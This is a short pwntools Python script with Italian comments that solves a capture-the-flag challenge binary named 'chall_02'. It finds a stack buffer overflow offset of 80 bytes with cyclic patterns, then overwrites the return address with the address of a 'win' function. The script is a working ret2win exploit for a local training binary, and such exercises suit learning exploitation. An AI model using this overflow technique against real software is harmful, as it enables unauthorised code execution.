#!/bin/python3
from pwn import *

p = process("./chall_02")

#Analisi del formato ELF binario
#Ci permette di estrarre informazioni utili dal binario
p_elf = ELF("./chall_02")

'''
Offset con cyclic

Gereazione Payload:
cyclic -n 4 100

Verificabile con:
gdb, valgrind, strace

Fault Address: 0x61616175

Generazione Offset:
cyclic -n 4 -l 0x61616175
Output: 80

Payload Ipotetico:
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'+'AAAA'

'AAAA': Puntatore ad un'altra funzione o segmento di memoria eseguibile

'''

win_function_addr = p_elf.symbols["win"] # Alternativa p_elf.sym["win"]

payload = b"B"*80 + p32(win_function_addr)

p.sendline(payload)
p.interactive()